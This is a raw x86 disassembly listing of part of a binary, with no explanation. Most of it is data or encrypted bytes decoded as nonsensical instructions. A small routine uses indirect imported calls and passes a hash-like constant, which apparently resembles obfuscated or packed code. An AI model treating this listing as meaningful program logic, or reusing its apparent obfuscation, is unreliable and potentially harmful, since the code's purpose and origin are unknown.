  422b88:	cmp    eax,0x453306e0
  422b8d:	test   BYTE PTR [esi],ah
  422b8f:	out    dx,eax
  422b90:	frstor [edi]
  422b92:	scas   al,BYTE PTR es:[edi]
  422b93:	xor    dh,dh
  422b95:	xchg   ecx,eax
  422b96:	cmp    al,0xfe
  422b98:	int3   
  422b99:	aam    0xb2
  422b9b:	pop    ds
  422b9c:	in     eax,0xc1
  422b9e:	sbb    cl,bl
  422ba0:	shl    DWORD PTR [esi-0x345eecdd],0x92
  422ba7:	es push ecx
  422ba9:	outs   dx,DWORD PTR ds:[esi]
  422baa:	inc    edx
  422bab:	xchg   DWORD PTR [eax+ecx*4-0x3],edi
  422baf:	cmp    DWORD PTR [ebx],ecx
  422bb1:	dec    ebp
  422bb2:	sub    DWORD PTR [edi],0xc93c5433
  422bb8:	neg    DWORD PTR [esi]
  422bba:	std    
  422bbb:	test   al,0xb9
  422bbd:	shr    BYTE PTR [esi-0x66658bad],1
  422bc3:	into   
  422bc4:	dec    ebx
  422bc5:	mov    dh,BYTE PTR [eax]
  422bc7:	add    ah,BYTE PTR [eax-0x1a064b8d]
  422bcd:	cwde   
  422bce:	sub    bl,BYTE PTR [ebx-0x71a9aba9]
  422bd4:	out    0xb8,eax
  422bd6:	outs   dx,BYTE PTR ds:[esi]
  422bd7:	call   0xf8e4:0x59a11bce
  422bde:	push   ecx
  422bdf:	mov    dh,0x30
  422be1:	stos   BYTE PTR es:[edi],al
  422be2:	inc    ebx
  422be3:	sbb    edx,ebp
  422be5:	push   esi
  422be6:	adc    DWORD PTR [esi+esi*8],ebx
  422be9:	pop    ds
  422bea:	push   edi
  422beb:	mov    BYTE PTR [edi-0x44],ch
  422bee:	lods   al,BYTE PTR ds:[esi]
  422bef:	jl     0x422be3
  422bf1:	mov    esp,0xae6fc4f4
  422bf6:	in     eax,0xba
  422bf8:	scas   al,BYTE PTR es:[edi]
  422bf9:	pusha  
  422bfa:	mov    cl,0x75
  422bfc:	stc    
  422bfd:	fadd   DWORD PTR [edx+0x63]
  422c00:	inc    esi
  422c01:	out    0x74,al
  422c03:	jecxz  0x422bf3
  422c05:	rep ins DWORD PTR es:[edi],dx
  422c07:	sbb    al,0x66
  422c09:	mov    ch,0x87
  422c0b:	aam    0x66
  422c0d:	mov    edi,0x592cfa52
  422c12:	cmp    ebp,DWORD PTR cs:[edx-0x1e31df3a]
  422c19:	mov    ds:0x4774e585,al
  422c1e:	js     0x422c08
  422c20:	inc    esp
  422c21:	xor    al,0x7e
  422c23:	scas   eax,DWORD PTR es:[edi]
  422c24:	xchg   ebp,eax
  422c25:	push   ds
  422c26:	les    esi,FWORD PTR [ebx-0x6a]
  422c29:	rol    BYTE PTR [ebx],1
  422c2b:	or     eax,0x19209039
  422c30:	lea    eax,ds:0x3637a5d0
  422c36:	ins    BYTE PTR es:[edi],dx
  422c37:	stc    
  422c38:	dec    edi
  422c39:	loope  0x422c67
  422c3b:	jbe    0x422c0a
  422c3d:	adc    DWORD PTR [ecx],edx
  422c3f:	mov    ebx,DWORD PTR [ecx]
  422c41:	bound  esi,QWORD PTR [ebx+edx*2]
  422c44:	(bad)  
  422c45:	cli    
  422c46:	stc    
  422c47:	sbb    eax,DWORD PTR [edx]
  422c49:	ret    0x8117
  422c4c:	jae    0x422c74
  422c4e:	aam    0x4c
  422c50:	js     0x422beb
  422c52:	je     0x422c0c
  422c54:	add    cl,BYTE PTR [edx+0x71]
  422c57:	hlt    
  422c58:	cmp    eax,0x603d35de
  422c5d:	mov    dh,0xf3
  422c5f:	mov    ds:0x8e6afe0e,al
  422c64:	mul    BYTE PTR [ebp-0x1d8d9f88]
  422c6a:	lods   eax,DWORD PTR ds:[esi]
  422c6b:	aam    0xca
  422c6d:	jp     0x422cc1
  422c6f:	dec    ebx
  422c70:	mov    edi,0x2592abdd
  422c75:	sub    al,0x54
  422c77:	push   cs
  422c78:	pushf  
  422c79:	test   BYTE PTR [edx+edi*1],0x59
  422c7d:	aad    0xf8
  422c7f:	icebp  
  422c80:	imul   edx,DWORD PTR [ecx-0x20],0x867feaba
  422c87:	sbb    BYTE PTR [ebx+eiz*1-0x4c],ch
  422c8b:	test   DWORD PTR [eax+0x5c9965c5],0x6ef7280
  422c95:	loop   0x422cd3
  422c97:	pandn  mm1,QWORD PTR [eax]
  422c9a:	adc    dl,BYTE PTR [ecx+edi*4-0x733f7c66]
  422ca1:	sbb    ebx,eax
  422ca3:	iret   
  422ca4:	dec    eax
  422ca5:	or     eax,0x2233329e
  422caa:	cmp    DWORD PTR [edi+0x37],eax
  422cad:	pop    esi
  422cae:	in     eax,dx
  422caf:	aas    
  422cb0:	cmp    ecx,DWORD PTR [ecx-0x6a]
  422cb3:	into   
  422cb4:	push   0x3f717570
  422cb9:	lahf   
  422cba:	mov    ch,0x87
  422cbc:	push   ds
  422cbd:	iret   
  422cbe:	or     al,0x90
  422cc0:	dec    ebx
  422cc1:	mov    eax,ds:0xe4cff571
  422cc6:	xchg   esi,eax
  422cc7:	fucomip st,st(0)
  422cc9:	outs   dx,DWORD PTR ds:[esi]
  422cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ccb:	int    0xc8
  422ccd:	push   eax
  422cce:	or     al,0x5a
  422cd0:	repz xor al,0x75
  422cd3:	pusha  
  422cd4:	cmp    eax,0x3612af8f
  422cd9:	or     esi,DWORD PTR [edx+0x37a94532]
  422cdf:	dec    eax
  422ce0:	ret    
  422ce1:	call   DWORD PTR ds:0xb5f022cb
  422ce7:	push   es
  422ce8:	inc    ebx
  422ce9:	pushf  
  422cea:	xchg   edi,eax
  422ceb:	fcomp  QWORD PTR [edi+0x3e]
  422cee:	out    dx,al
  422cef:	push   edi
  422cf0:	gs sub al,0xcf
  422cf3:	fisubr DWORD PTR [ebp-0x4d]
  422cf6:	add    BYTE PTR [edi+eiz*2+0x1f],ch
  422cfa:	cmp    eax,0xfb8d21b4
  422cff:	je     0x422cd9
  422d01:	jae    0x422d4a
  422d03:	popf   
  422d04:	add    eax,0x3996073f
  422d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d0a:	icebp  
  422d0b:	dec    edx
  422d0c:	aad    0x1b
  422d0e:	xchg   ecx,eax
  422d0f:	fimul  DWORD PTR es:[ecx]
  422d13:	fwait
  422d14:	lds    esp,FWORD PTR [ebx]
  422d16:	loop   0x422cc5
  422d18:	cmp    DWORD PTR [esi+0x49],ecx
  422d1b:	enter  0x3f34,0x98
  422d1f:	out    dx,al
  422d20:	mov    eax,ds:0x64014dc7
  422d25:	mov    ebp,0x72cca171
  422d2a:	xor    BYTE PTR [esi-0x71e48659],bh
  422d30:	cli    
  422d31:	dec    edx
  422d32:	je     0x422da7
  422d34:	jl     0x422cc2
  422d36:	mov    bl,BYTE PTR [eax+ebx*1+0x5f]
  422d3a:	push   eax
  422d3b:	fdivr  DWORD PTR [ebp-0x21]
  422d3e:	test   al,0x80
  422d40:	jl     0x422d8d
  422d42:	arpl   WORD PTR [eax+0x1a25c5c7],bp
  422d48:	mov    bh,0xbf
  422d4a:	mov    ch,0x1e
  422d4c:	inc    edi
  422d4d:	cli    
  422d4e:	and    BYTE PTR [ebx-0x36],0xa2
  422d52:	inc    ebp
  422d53:	jmp    0x422da2
  422d55:	adc    bh,dl
  422d57:	or     edi,DWORD PTR [edx-0x71]
  422d5a:	outs   dx,DWORD PTR ds:[esi]
  422d5b:	pop    eax
  422d5c:	push   esp
  422d5d:	and    DWORD PTR [ebx],0xffffff84
  422d60:	cwde   
  422d61:	dec    edi
  422d62:	sub    DWORD PTR [ebx+0x6b9df0d2],edi
  422d68:	mov    edi,DWORD PTR [eax+edi*8+0x76]
  422d6c:	xchg   ecx,eax
  422d6d:	add    BYTE PTR [esi+0x74edf762],dh
  422d73:	in     eax,dx
  422d74:	xor    al,0x37
  422d76:	jae    0x422d1e
  422d78:	sub    edi,edi
  422d7a:	jmp    0x7ac2:0x1a9e4ed7
  422d81:	mov    cl,BYTE PTR [ecx]
  422d83:	xor    eax,0x5df44902
  422d88:	mov    ebx,0x94df7c9
  422d8d:	mov    al,BYTE PTR [eax]
  422d8f:	xchg   esp,eax
  422d90:	cmp    ebx,ebp
  422d92:	loope  0x422d4d
  422d94:	or     bl,ch
  422d96:	or     ebx,ecx
  422d98:	xchg   esi,eax
  422d99:	mov    edx,0x462596
  422d9e:	pop    ds
  422d9f:	pop    ecx
  422da0:	pop    es
  422da1:	lea    ecx,[ebx]
  422da3:	int    0xfb
  422da5:	mov    DWORD PTR [esi],esi
  422da7:	fisub  DWORD PTR [eax+0x72]
  422daa:	mov    bh,0x13
  422dac:	ins    DWORD PTR es:[edi],dx
  422dad:	mov    ebx,0x1f271ad2
  422db2:	jnp    0x422d9c
  422db4:	imul   eax,DWORD PTR [edx],0x35d598fd
  422dba:	xchg   ebx,eax
  422dbb:	icebp  
  422dbc:	call   0x52eee0
  422dc1:	aam    0x4
  422dc3:	mov    edi,0xb870b089
  422dc8:	mov    eax,ds:0x59756bc7
  422dcd:	repnz mov ds:0x998a37d5,eax
  422dd3:	fsub   QWORD PTR [edx-0x25137a45]
  422dd9:	cdq    
  422dda:	adc    BYTE PTR [esi],dh
  422ddc:	mov    al,0xbe
  422dde:	jae    0x422d7a
  422de0:	lods   al,BYTE PTR ds:[esi]
  422de1:	sar    BYTE PTR [ebx-0x5e55e32d],1
  422de7:	push   ebp
  422de8:	jp     0x422ddd
  422dea:	shl    BYTE PTR [esi],1
  422dec:	retf   0x9788
  422def:	sub    ah,bl
  422df1:	inc    ebp
  422df2:	jo     0x422e0f
  422df4:	scas   al,BYTE PTR es:[edi]
  422df5:	pop    edi
  422df6:	dec    ebx
  422df7:	jns    0x422d82
  422df9:	dec    eax
  422dfa:	je     0x422ddb
  422dfc:	add    eax,eax
  422dfe:	lds    edx,FWORD PTR [esi]
  422e00:	pop    ecx
  422e01:	pop    esi
  422e02:	push   ebp
  422e03:	sti    
  422e04:	or     DWORD PTR [edx],eax
  422e06:	and    ch,BYTE PTR [edi+edx*1-0x70]
  422e0a:	clc    
  422e0b:	xor    ah,bl
  422e0d:	sahf   
  422e0e:	ss leave 
  422e10:	xor    ah,BYTE PTR [ecx]
  422e12:	test   eax,0x84096c4b
  422e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e18:	xchg   ecx,eax
  422e19:	shl    BYTE PTR [esi+0x40],0x86
  422e1d:	iret   
  422e1e:	xchg   ebp,eax
  422e1f:	mov    ds:0xcd140c3f,eax
  422e24:	clc    
  422e25:	leave  
  422e26:	cld    
  422e27:	dec    edx
  422e28:	das    
  422e29:	add    eax,DWORD PTR ds:0xdcda4e5e
  422e2f:	retf   0x20d7
  422e32:	ret    
  422e33:	xor    eax,0x66170a61
  422e38:	cld    
  422e39:	cmp    esp,esp
  422e3b:	add    dl,ah
  422e3d:	and    eax,0xd4e6a4c3
  422e42:	jnp    0x422de8
  422e44:	dec    ecx
  422e45:	jmp    0x3bca:0x38aca072
  422e4c:	inc    eax
  422e4d:	adc    BYTE PTR [eax+0x669806a8],0x2a
  422e54:	stc    
  422e55:	push   cs
  422e56:	lock ja 0x422e8f
  422e59:	fcom   DWORD PTR [ecx]
  422e5b:	mov    ds:0x13896275,eax
  422e60:	fdiv   DWORD PTR [edi-0x42]
  422e63:	(bad)  
  422e64:	loop   0x422ea3
  422e66:	clc    
  422e67:	bswap  edx
  422e69:	mov    al,0xa2
  422e6b:	lds    ecx,FWORD PTR [ebp-0x63]
  422e6e:	inc    edi
  422e6f:	cli    
  422e70:	jae    0x422e99
  422e72:	popf   
  422e73:	fnsave [edi+0x3b]
  422e76:	add    bl,BYTE PTR [ebp+0x7e4b8971]
  422e7c:	hlt    
  422e7d:	or     dl,BYTE PTR [ebx+eiz*1+0x151365aa]
  422e84:	pushf  
  422e85:	dec    ecx
  422e86:	inc    edx
  422e87:	(bad)  
  422e88:	fstp   QWORD PTR ds:0x350e7b18
  422e8e:	mov    al,0x1b
  422e90:	mov    dh,0xfa
  422e92:	stos   BYTE PTR es:[edi],al
  422e93:	xchg   edx,eax
  422e94:	inc    ebx
  422e95:	dec    esi
  422e96:	fwait
  422e97:	dec    esi
  422e98:	sti    
  422e99:	add    al,BYTE PTR [esp+edx*1-0x65b8def3]
  422ea0:	inc    edi
  422ea1:	jmp    0x4ecf2859
  422ea6:	mov    DWORD PTR [eax+0x12],esi
  422ea9:	icebp  
  422eaa:	and    bh,BYTE PTR [edi]
  422eac:	outs   dx,BYTE PTR ds:[esi]
  422ead:	pop    ss
  422eae:	adc    BYTE PTR [ebx-0x4b],dh
  422eb1:	in     al,dx
  422eb2:	mov    dl,0xb3
  422eb4:	popa   
  422eb5:	sbb    eax,0xbbfa35b0
  422eba:	imul   edi,DWORD PTR [edx],0xe0f7705f
  422ec0:	(bad)  
  422ec1:	push   ebx
  422ec2:	cmp    eax,0xda8039af
  422ec7:	test   eax,0xe91cbf4c
  422ecc:	fistp  DWORD PTR [edi-0x44]
  422ecf:	or     BYTE PTR ds:0x12190fb4,cl
  422ed5:	aaa    
  422ed6:	int    0x13
  422ed8:	jp     0x422f03
  422eda:	loope  0x422ee6
  422edc:	mul    DWORD PTR [ebx+0x476acedb]
  422ee2:	ret    
  422ee3:	test   DWORD PTR [ebx-0x3f],ecx
  422ee6:	call   0x741c:0xef74c3f6
  422eed:	or     eax,0xe573af17
  422ef2:	xchg   DWORD PTR [edx+0x1db9c242],ebx
  422ef8:	je     0x422e7a
  422efa:	aad    0x1f
  422efc:	sub    cl,BYTE PTR [esi+0x3d133332]
  422f02:	enter  0xdff9,0xf0
  422f06:	and    BYTE PTR [eax-0x4d53c122],0x6a
  422f0d:	pop    es
  422f0e:	xor    esp,DWORD PTR [ecx-0x3f]
  422f11:	int3   
  422f12:	sub    BYTE PTR [eax],dh
  422f14:	pushf  
  422f15:	mov    edx,0xe0377aeb
  422f1a:	sbb    al,0x71
  422f1c:	mov    ax,0x1
  422f20:	add    BYTE PTR [eax],al
  422f22:	mov    esp,ebp
  422f24:	pop    ebp
  422f25:	ret    
  422f26:	int3   
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0x2653f40e
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	jmp    FWORD PTR [ebx+0x21]
  422fc5:	xlat   BYTE PTR ds:[ebx]
  422fc6:	daa    
  422fc7:	adc    cl,BYTE PTR [ebx+0x34503836]
  422fcd:	sbb    ax,0xd9cc
  422fd1:	jnp    0x42301a
  422fd3:	lahf   
  422fd4:	adc    DWORD PTR [ebx+0x34543836],ecx
  422fda:	pop    bp
  422fdc:	xor    esp,DWORD PTR [esi]
  422fde:	jnp    0x423027
  422fe0:	daa    
  422fe1:	adc    DWORD PTR [ebx+0x34543836],ecx
  422fe7:	sbb    ax,0x2633
  422feb:	jnp    0x423034
  422fed:	daa    
  422fee:	adc    DWORD PTR [ebx+0x34543836],ecx
  422ff4:	sbb    ax,0x2633
  422ff8:	jnp    0x423041
  422ffa:	daa    
  422ffb:	adc    DWORD PTR [ebx+0x34ac3836],ecx
  423001:	sbb    ax,0x393d
  423005:	ror    DWORD PTR [ecx+0x27],0xa5
  423009:	cmp    bl,0x19
  42300c:	in     al,dx
  42300d:	xor    eax,0x7212d02a
  423012:	adc    ebp,DWORD PTR [esi]
  423014:	push   esp
  423015:	xor    ebx,edi
  423017:	inc    esp
  423018:	push   edi
  423019:	xor    eax,DWORD PTR [esi+0x7]
  42301c:	jo     0x423031
  42301e:	inc    ebp
  42301f:	sbb    ch,BYTE PTR [ecx]
  423021:	dec    ecx
  423022:	jle    0x423023
  423024:	push   ss
  423025:	pop    edx
  423026:	xor    DWORD PTR [esp+edx*1],edx
  423029:	push   0x2912065d
  42302e:	pop    es
  42302f:	push   ebp
  423030:	les    esp,FWORD PTR [ebp+0x18]
  423033:	cmp    DWORD PTR [ebx+0x2],ebx
  423036:	js     0x423055
  423038:	sub    esi,DWORD PTR [esi+0x4d]
  42303b:	add    edx,DWORD PTR [ecx]
  42303d:	mov    esi,DWORD PTR [esi]
  42303f:	cmp    BYTE PTR [esp+esi*1+0x66],dl
  423043:	sbb    ch,BYTE PTR [edx-0x20fbdd26]
  423049:	add    DWORD PTR [ecx+0x3ec6c075],0x25
  423050:	in     eax,0xa1
  423052:	sub    al,0x23
  423054:	and    ch,BYTE PTR [ebx]
  423056:	sbb    edx,esp
  423058:	into   
  423059:	stos   BYTE PTR es:[edi],al
  42305a:	pop    esi
  42305b:	ins    BYTE PTR es:[edi],dx
  42305c:	add    esp,DWORD PTR ds:0xd583e439
  423062:	sub    eax,0x320fee49
  423067:	cmp    al,0xcc
  423069:	hlt    
  42306a:	pop    ss
  42306b:	pop    ds
  42306c:	test   al,0x42
  42306e:	dec    ebp
  42306f:	popa   
  423070:	jmp    0xd4b46c8e
  423075:	and    eax,0xb4cb576c
  42307a:	jno    0x423089
  42307c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42307d:	adc    BYTE PTR [ecx+0x3ec6c06e],al
  423083:	and    eax,0x532ca0e5
  423088:	mov    esi,0xee341bb5
  42308d:	mov    eax,0x8f9e795e
  423092:	cmp    DWORD PTR [esi+0x1e],edi
  423095:	jp     0x4230c4
  423097:	sbb    DWORD PTR [ebx-0x5c],esi
  42309a:	xor    cl,BYTE PTR [ecx+edx*2]
  42309d:	outs   dx,BYTE PTR ds:[esi]
  42309e:	pop    ss
  42309f:	jno    0x42307f
  4230a1:	jmp    0x84b6aff3
  4230a6:	cmp    al,0x7a
  4230a8:	lods   al,BYTE PTR ds:[esi]
  4230a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230aa:	ins    BYTE PTR es:[edi],dx
  4230ab:	dec    edi
  4230ac:	pop    edx
  4230ad:	inc    ebp
  4230ae:	adc    eax,DWORD PTR [edi+ebx*8]
  4230b1:	add    DWORD PTR [ecx+0x34543836],0x66
  4230b8:	sbb    eax,0x22b2633
  4230bd:	daa    
  4230be:	adc    edi,eax
  4230c0:	aaa    
  4230c1:	cmp    dl,BYTE PTR [eax+ebx*8-0x7b]
  4230c5:	inc    edx
  4230c6:	jl     0x4230ee
  4230c8:	jnp    0x423111
  4230ca:	daa    
  4230cb:	adc    DWORD PTR [ebx+0x34b43836],ecx
  4230d1:	gs sbb al,0x38
  4230d4:	daa    
  4230d5:	jno    0x42311e
  4230d7:	daa    
  4230d8:	std    
  4230d9:	(bad)  
  4230da:	cmp    BYTE PTR ss:[eax+0x32],dl
  4230de:	sbb    ax,0x2633
  4230e2:	jnp    0x42312a
  4230e4:	call   0x3454:0x28368b11
  4230eb:	sbb    ax,0x2636
  4230ef:	jnp    0x423138
  4230f1:	adc    WORD PTR [ebx+0x34543826],cx
  4230f8:	fs sbb eax,0x467b2333
  4230fe:	daa    
  4230ff:	adc    DWORD PTR [ebx+0x34513836],ecx
  423105:	addr16 sbb eax,0x477b2633
  42310b:	daa    
  42310c:	xchg   ecx,eax
  42310d:	xor    BYTE PTR [esi],0x38
  423110:	push   eax
  423111:	xor    al,0x66
  423113:	mov    al,ds:0x457b2302
  423118:	daa    
  423119:	adc    DWORD PTR [ebx],ecx
  42311b:	cmp    BYTE PTR ss:[esp+esi*1+0x66],al
  423120:	or     eax,0x477b2633
  423125:	aaa    
  423126:	adc    DWORD PTR [ebx+0x34543826],ecx
  42312c:	sbb    ax,0x3633
  423130:	jnp    0x423179
  423132:	daa    
  423133:	adc    DWORD PTR [ebx+0x34543836],ecx
  423139:	sbb    ax,0x48b7
  42313d:	jo     0x423186
  42313f:	dec    esi
  423140:	adc    cl,BYTE PTR [ebx+0x3f643836]
  423146:	data16 ror BYTE PTR [esi],cl
  423149:	es jnp 0x423193
  42314c:	daa    
  42314d:	adc    DWORD PTR [ebx+0x34543836],ecx
  423153:	sbb    ax,0x2633
  423157:	jnp    0x4231a0
  423159:	daa    
  42315a:	adc    DWORD PTR [ebx+0x34543836],ecx
  423160:	sbb    ax,0x2633
  423164:	jnp    0x4231ad
  423166:	daa    
  423167:	adc    DWORD PTR [ebx+0x34543836],ecx
  42316d:	sbb    ax,0x2633
  423171:	jnp    0x4231ba
  423173:	daa    
  423174:	adc    DWORD PTR [ebx+0x34543836],ecx
  42317a:	sbb    ax,0x2633
  42317e:	jnp    0x4231c7
  423180:	daa    
  423181:	adc    DWORD PTR [ebx+0x34543836],ecx
  423187:	sbb    ax,0x2633
  42318b:	jnp    0x4231d4
  42318d:	daa    
  42318e:	adc    DWORD PTR [ebx+0x34543836],ecx
  423194:	sbb    ax,0x2633
  423198:	jnp    0x4231e1
  42319a:	daa    
  42319b:	adc    DWORD PTR [ebx+0x34543836],ecx
  4231a1:	sbb    ax,0x2633
  4231a5:	jnp    0x4231ee
  4231a7:	daa    
  4231a8:	adc    DWORD PTR [ebx+0x34543836],ecx
  4231ae:	sbb    ax,0x2633
  4231b2:	jnp    0x42321d
  4231b4:	push   ebx
  4231b5:	je     0x4231aa
  4231b7:	inc    edx
  4231b8:	cmp    BYTE PTR [esp+esi*1+0x66],dl
  4231bc:	cmp    eax,0x577b2638
  4231c1:	daa    
  4231c2:	adc    DWORD PTR [ebx+0x34543c0c],ecx
  4231c8:	bound  ebx,QWORD PTR ds:0x43e7633
  4231ce:	adc    eax,0x3836c445
  4231d3:	push   esp
  4231d4:	xor    al,0x66
  4231d6:	sbb    eax,0xa77b2613
  4231db:	or     DWORD PTR [ebx-0x8],esp
  4231de:	inc    esp
  4231df:	pop    ebx
  4231e0:	push   esp
  4231e1:	xor    al,0x66
  4231e3:	sbb    eax,0x477b2663
  4231e8:	pop    ss
  4231e9:	sbb    cl,BYTE PTR [ebx+0x34546836]
  4231ef:	and    si,WORD PTR [edi]
  4231f2:	es jnp 0x42323c
  4231f5:	daa    
  4231f6:	adc    DWORD PTR [ebx+0x34543836],ecx
  4231fc:	sbb    ax,0x633
  423200:	jnp    0x423249
  423202:	(bad)  
  423203:	adc    DWORD PTR [ebx+0x34543836],ecx
  423209:	sbb    ax,0x2633
  42320d:	jnp    0x423256
  42320f:	daa    
  423210:	adc    DWORD PTR [ebx+0x34543836],ecx
  423216:	sbb    ax,0x2633
  42321a:	jnp    0x423263
  42321c:	daa    
  42321d:	adc    DWORD PTR [ebx+0x34543836],ecx
  423223:	sbb    ax,0x2633
  423227:	jnp    0x423270
  423229:	daa    
  42322a:	adc    DWORD PTR [ebx+0x34543836],ecx
  423230:	sbb    ax,0x2633
  423234:	jnp    0x42327d
  423236:	daa    
  423237:	adc    DWORD PTR [ebx+0x34543836],ecx
  42323d:	sbb    ax,0x2633
  423241:	jnp    0x42328a
  423243:	daa    
  423244:	adc    DWORD PTR [ebx+0x34543836],ecx
  42324a:	sbb    ax,0x2633
  42324e:	jnp    0x423297
  423250:	daa    
  423251:	adc    DWORD PTR [ebx+0x34543836],ecx
  423257:	sbb    ax,0x2633
  42325b:	jnp    0x4232a4
  42325d:	daa    
  42325e:	adc    DWORD PTR [ebx+0x34543836],ecx
  423264:	sbb    ax,0x2633
  423268:	jnp    0x4232b1
  42326a:	daa    
  42326b:	adc    DWORD PTR [ebx+0x34543836],ecx
  423271:	sbb    ax,0x2633
  423275:	jnp    0x4232be
  423277:	daa    
  423278:	adc    DWORD PTR [ebx+0x34543836],ecx
  42327e:	sbb    ax,0x2633
  423282:	jnp    0x4232cb
  423284:	daa    
  423285:	adc    DWORD PTR [ebx+0x34543836],ecx
  42328b:	sbb    ax,0x2633
  42328f:	jnp    0x4232d8
  423291:	daa    
  423292:	adc    DWORD PTR [ebx+0x34543836],ecx
  423298:	sbb    ax,0x2633
  42329c:	jnp    0x4232e5
  42329e:	daa    
  42329f:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232a5:	sbb    ax,0x2633
  4232a9:	jnp    0x4232f2
  4232ab:	daa    
  4232ac:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232b2:	sbb    ax,0x2633
  4232b6:	jnp    0x4232ff
  4232b8:	daa    
  4232b9:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232bf:	sbb    ax,0x2633
  4232c3:	jnp    0x42330c
  4232c5:	daa    
  4232c6:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232cc:	sbb    ax,0x2633
  4232d0:	jnp    0x423319
  4232d2:	daa    
  4232d3:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232d9:	sbb    ax,0x2633
  4232dd:	jnp    0x423326
  4232df:	daa    
  4232e0:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232e6:	sbb    ax,0x2633
  4232ea:	jnp    0x423333
  4232ec:	daa    
  4232ed:	adc    DWORD PTR [ebx+0x34543836],ecx
  4232f3:	sbb    ax,0x2633
  4232f7:	jnp    0x423340
  4232f9:	daa    
  4232fa:	adc    DWORD PTR [ebx+0x34543836],ecx
  423300:	sbb    ax,0x2633
  423304:	jnp    0x42334d
  423306:	daa    
  423307:	adc    DWORD PTR [ebx+0x34543836],ecx
  42330d:	sbb    ax,0x2633
  423311:	jnp    0x42335a
  423313:	daa    
  423314:	adc    DWORD PTR [ebx+0x34543836],ecx
  42331a:	sbb    ax,0x2633
  42331e:	jnp    0x423367
  423320:	daa    
  423321:	adc    DWORD PTR [ebx+0x34543836],ecx
  423327:	sbb    ax,0x2633
  42332b:	jnp    0x423374
  42332d:	daa    
  42332e:	adc    DWORD PTR [ebx+0x34543836],ecx
  423334:	sbb    ax,0x2633
  423338:	jnp    0x423381
  42333a:	daa    
  42333b:	adc    DWORD PTR [ebx+0x34543836],ecx
  423341:	sbb    ax,0x2633
  423345:	jnp    0x42338e
  423347:	daa    
  423348:	adc    DWORD PTR [ebx+0x34543836],ecx
  42334e:	sbb    ax,0x2633
  423352:	jnp    0x42339b
  423354:	daa    
  423355:	adc    DWORD PTR [ebx+0x34543836],ecx
  42335b:	sbb    ax,0x2633
  42335f:	jnp    0x4233a8
  423361:	daa    
  423362:	adc    DWORD PTR [ebx+0x34543836],ecx
  423368:	sbb    ax,0x2633
  42336c:	jnp    0x4233b5
  42336e:	daa    
  42336f:	adc    DWORD PTR [ebx+0x34543836],ecx
  423375:	sbb    ax,0x2633
  423379:	jnp    0x4233c2
  42337b:	daa    
  42337c:	adc    DWORD PTR [ebx+0x34543836],ecx
  423382:	sbb    ax,0x2633
  423386:	jnp    0x4233cf
  423388:	daa    
  423389:	adc    DWORD PTR [ebx+0x34543836],ecx
  42338f:	sbb    ax,0x2633
  423393:	jnp    0x4233dc
  423395:	daa    
  423396:	adc    DWORD PTR [ebx+0x34543836],ecx
  42339c:	sbb    ax,0x2633
  4233a0:	jnp    0x4233e9
  4233a2:	daa    
  4233a3:	adc    DWORD PTR [ebx+0x34543836],ecx
  4233a9:	sbb    ax,0x2633
  4233ad:	jnp    0x4233f6
  4233af:	daa    
  4233b0:	adc    DWORD PTR [ebx+0x34543836],ecx
  4233b6:	sbb    ax,0x2633
  4233ba:	jnp    0x423403
  4233bc:	daa    
  4233bd:	adc    DWORD PTR [ebx+0x34543836],ecx
  4233c3:	and    ebx,esi
  4233c5:	cmp    DWORD PTR [esi],esp
  4233c7:	push   esp
  4233c8:	inc    edi
  4233c9:	daa    
  4233ca:	add    DWORD PTR [ebx-0x1109edca],ecx
  4233d0:	pop    ss
  4233d1:	jnp    0x42339f
  4233d3:	or     esp,ebp
  4233d5:	shl    BYTE PTR [edi-0x4],0xbd
  4233d9:	fisubr WORD PTR [ebx]
  4233db:	loopne 0x42337e
  4233dd:	add    BYTE PTR [edi+esi*4+0x7c],ch
  4233e1:	push   0xe60790f6
  4233e6:	shl    BYTE PTR [edx+0x7f48f2d5],cl
  4233ec:	mov    ds:0x68744219,eax
  4233f1:	mov    al,ds:0x7338149c
  4233f6:	xchg   ebx,eax
  4233f7:	out    dx,al
  4233f8:	dec    eax
  4233f9:	bound  ecx,QWORD PTR [ebx-0x2e]
  4233fc:	jne    0x423418
  4233fe:	int3   
  4233ff:	lahf   
